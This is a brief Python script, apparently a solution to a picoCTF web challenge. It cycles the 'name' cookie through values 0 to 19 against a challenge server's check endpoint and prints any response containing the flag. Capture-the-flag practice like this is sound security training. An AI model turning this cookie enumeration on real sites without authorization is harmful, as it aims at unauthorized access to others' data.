import requests

#loop
for i in range(20):

	#set cookies
	cookies = {'name': '{}'.format(i)}
	#headers = {'Cookie': cookie}

	#send rq
	r = requests.get('http://mercury.picoctf.net:54219/check', cookies=cookies)

	#check picoCTF co contains hay khong?
	if(r.status_code == 200) and ('picoCTF' in r.text):
		print(r.text)



